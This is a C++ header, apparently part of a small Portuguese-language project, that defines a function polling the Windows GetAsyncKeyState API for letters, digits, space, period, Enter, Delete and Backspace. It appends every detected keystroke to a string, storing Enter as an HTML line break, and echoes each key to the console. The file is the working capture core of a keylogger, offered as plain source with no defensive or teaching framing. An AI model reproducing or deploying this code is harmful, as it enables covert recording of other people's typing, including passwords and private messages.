#pragma once
#include <windows.h>

using namespace std;

void teclasPrecionadas(string& teclas, int tempoSleep) {
    bool noKeysPressed = true;
    for (int key = 1; key < 256; ++key) {
        if (GetAsyncKeyState(key) & 0x8000) {
            noKeysPressed = false;
            break;
        }
    }

    if (GetAsyncKeyState(0x41)) {
        cout << "a";
        teclas += "a";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x42)) {
        cout << "b";
        teclas += "b";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x43)) {
        cout << "c";
        teclas += "c";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x44)) {
        cout << "d";
        teclas += "d";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x45)) {
        cout << "e";
        teclas += "e";
        Sleep(tempoSleep);
    }

    if (GetAsyncKeyState(0x46)) {
        cout << "f";
        teclas += "f";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x47)) {
        cout << "g";
        teclas += "g";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x48)) {
        cout << "h";
        teclas += "h";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x49)) {
        cout << "i";
        teclas += "i";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x4a)) {
        cout << "j";
        teclas += "j";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x4b)) {
        cout << "k";
        teclas += "k";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x4c)) {
        cout << "l";
        teclas += "l";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x4d)) {
        cout << "m";
        teclas += "m";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x4e)) {
        cout << "n";
        teclas += "n";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x4f)) {
        cout << "o";
        teclas += "o";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x50)) {
        cout << "p";
        teclas += "p";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x51)) {
        cout << "q";
        teclas += "q";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x52)) {
        cout << "r";
        teclas += "r";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x53)) {
        cout << "s";
        teclas += "s";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x54)) {
        cout << "t";
        teclas += "t";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x55)) {
        cout << "u";
        teclas += "u";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x56)) {
        cout << "v";
        teclas += "v";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x57)) {
        cout << "w";
        teclas += "w";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x58)) {
        cout << "x";
        teclas += "x";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x59)) {
        cout << "y";
        teclas += "y";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x5A)) {
        cout << "z";
        teclas += "z";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(VK_SPACE)) {
        cout << " ";
        teclas += " ";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x6E)) {
        cout << ".";
        teclas += ".";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x0d)) {
        cout << "/n";
        teclas += "<br>";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x30)) {
        cout << "0";
        teclas += "0";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x31)) {
        cout << "1";
        teclas += "1";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x32)) {
        cout << "2";
        teclas += "2";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x33)) {
        cout << "3";
        teclas += "3";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x34)) {
        cout << "4";
        teclas += "4";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x35)) {
        cout << "5";
        teclas += "5";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x36)) {
        cout << "6";
        teclas += "6";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x37)) {
        cout << "7";
        teclas += "7";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x38)) {
        cout << "8";
        teclas += "8";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(0x39)) {
        cout << "9";
        teclas += "9";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(VK_DELETE)) {
        cout << "\\del*";
        teclas += "\\del*";
        Sleep(tempoSleep);
    }
    if (GetAsyncKeyState(VK_BACK)) {
        cout << "\\back*";
        teclas += "\\back*";
        Sleep(tempoSleep);
    }
    if (noKeysPressed) {
        cout << "";
        teclas += "";
        Sleep(tempoSleep);
    }
}
